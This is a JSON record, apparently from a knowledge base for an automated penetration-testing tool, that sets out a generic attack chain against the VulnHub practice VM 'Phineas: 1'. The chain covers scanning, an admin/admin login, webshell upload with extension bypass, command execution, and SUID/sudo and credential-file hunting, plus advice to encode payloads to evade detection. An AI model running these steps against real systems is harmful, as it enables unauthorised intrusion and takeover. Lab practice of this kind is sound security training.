{
  "vuln_id": "vulnhub_phineas",
  "description": "Phineas: 1是一个VulnHub虚拟机，包含多个漏洞，需要渗透测试获取root权限",
  "category": "weak_credential",
  "cves": [],
  "match_keywords": [
    "Phineas",
    "VulnHub",
    "calfcrusher"
  ],
  "fingerprint_keywords": [
    "Phineas: 1",
    "VulnHub entry"
  ],
  "affected_versions": "Phineas: 1虚拟机",
  "default_port": 80,
  "common_endpoints": [
    "/",
    "/admin",
    "/login"
  ],
  "detection_method": "使用nmap扫描目标IP，发现开放端口和服务，如HTTP服务在80端口",
  "exploit_steps": [
    {
      "step": 1,
      "description": "扫描目标网络，识别开放端口和服务",
      "command": "nmap -sV -sC {TARGET}",
      "expected_result": "发现80端口开放，运行HTTP服务",
      "notes": "使用默认扫描选项，可调整参数以加快扫描"
    },
    {
      "step": 2,
      "description": "访问Web服务，枚举目录和文件",
      "command": "curl -s http://{TARGET}/ | grep -o 'href=\"[^\"]*\"' | cut -d'\"' -f2",
      "expected_result": "获取页面链接，可能发现敏感端点如/admin或/login",
      "notes": "使用工具如gobuster或dirb进行更全面的目录爆破"
    },
    {
      "step": 3,
      "description": "尝试弱凭证登录，如默认密码或常见组合",
      "command": "curl -X POST http://{TARGET}/login -d 'username=admin&password=admin'",
      "expected_result": "登录成功，获取会话cookie或重定向到管理页面",
      "notes": "使用hydra或burp suite进行暴力破解"
    },
    {
      "step": 4,
      "description": "利用获取的权限执行命令或上传webshell",
      "command": "curl -X POST http://{TARGET}/upload -F 'file=@shell.php'",
      "expected_result": "文件上传成功，返回访问路径",
      "notes": "确保文件类型绕过，如使用.phtml扩展名"
    },
    {
      "step": 5,
      "description": "访问上传的webshell，执行系统命令",
      "command": "curl http://{TARGET}/uploads/shell.php?cmd=id",
      "expected_result": "返回当前用户id，如uid=33(www-data)",
      "notes": "使用编码或加密payload避免检测"
    }
  ],
  "verification_command": "curl http://{TARGET}/uploads/shell.php?cmd=whoami",
  "verification_success_sign": "返回www-data或类似非root用户",
  "requires_callback": false,
  "callback_note": "无需回连，但可设置反弹shell以获取交互式会话，替代方案：使用webshell执行命令",
  "remediation": "1. 使用强密码策略；2. 限制文件上传类型；3. 更新软件版本；4. 最小化服务暴露",
  "privesc_steps": [
    {
      "step": 1,
      "description": "通过 webshell 确认 uid/gid 与系统信息",
      "command": "id; uname -a"
    },
    {
      "step": 2,
      "description": "sudo 与 SUID 快速扫一遍",
      "command": "sudo -l 2>/dev/null; find / -perm -4000 -type f 2>/dev/null | head -40"
    },
    {
      "step": 3,
      "description": "家目录与 Web 目录下敏感配置",
      "command": "ls -la /var/www 2>/dev/null; ls -la /home 2>/dev/null"
    },
    {
      "step": 4,
      "description": "查找可能包含凭据的文件（限制深度）",
      "command": "find /home /var/www -maxdepth 3 -name '*.txt' -o -name '*.bak' 2>/dev/null | head -30"
    }
  ],
  "path_templates": [
    {
      "stage": "surface_enum",
      "precondition": "Web 入口存在",
      "action": "目录枚举与登录面识别",
      "success_sign": "发现 /admin 或 /login",
      "next_stage": "foothold"
    },
    {
      "stage": "foothold",
      "precondition": "弱凭据或上传",
      "action": "登录后找上传/命令执行点拿 RCE",
      "success_sign": "uid= 回显",
      "next_stage": "privesc"
    },
    {
      "stage": "privesc",
      "precondition": "www-data 类权限",
      "action": "凭据与配置翻找 + sudo/SUID",
      "success_sign": "root 或 flag",
      "next_stage": "objective"
    }
  ],
  "fallbacks": [
    {
      "stage": "foothold",
      "action": "上传被拦时尝试扩展名与 Content-Type 绕过"
    }
  ],
  "opsec_notes": [
    "先拿立足再横向翻文件，避免只打登录而不推进链"
  ],
  "tags": [
    "VulnHub",
    "boot2root",
    "weak_password",
    "file_upload",
    "privilege_escalation"
  ],
